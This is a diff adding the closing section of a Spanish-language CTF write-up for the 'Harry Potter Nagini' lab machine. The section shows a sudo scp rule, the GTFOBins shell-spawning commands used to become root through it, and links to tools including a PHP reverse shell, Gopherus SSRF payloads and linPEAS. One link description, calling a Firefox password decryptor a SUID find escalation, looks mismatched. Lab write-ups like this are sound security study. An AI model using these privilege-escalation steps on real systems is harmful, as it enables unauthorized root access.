@@ -185,3 +185,38 @@ El resultado es este:
 ```
 (root) NOPASSWD: /usr/bin/scp
 ```
+
+## Explotación de vulnerabilidades
+
+### SCP
+
+Al ver esto iremos a esta [página web](https://gtfobins.github.io/gtfobins/scp/#sudo) para ver como podemos explotar esta vulnerabilidad y ser **root**
+
+Encontramos estos comandos que nos ayudara a escalar privilegios:
+
+```
+TF=$(mktemp)
+echo 'sh 0<&2 1>&2' > $TF
+chmod +x "$TF"
+sudo scp -S $TF x y:
+```
+
+Gracias a esto conseguirmos ser **root**
+
+## Información Adicional
+
+Páginas web utilizadas:
+
+- [Curl](https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version) - Para la instalación del curl desde un repositorio
+
+- [Rustup](https://stackoverflow.com/questions/44303915/no-default-toolchain-configured-after-installing-rustup) - Solución al error de instalación del cargo
+
+- [Gopherus](https://github.com/tarunkant/Gopherus) - Herramienta para generar payloads para explotar el SSRF
+
+- [PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) - Reverse Shell PHP
+
+- [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Enumeración de escalada de privilegios local.
+
+- [Mozilla Decrypt](https://github.com/lclevy/firepwd) - Escalada de privilegios SUID con el find
+
+**[⬆ back to top](#-----harry-potter-nagini-)**
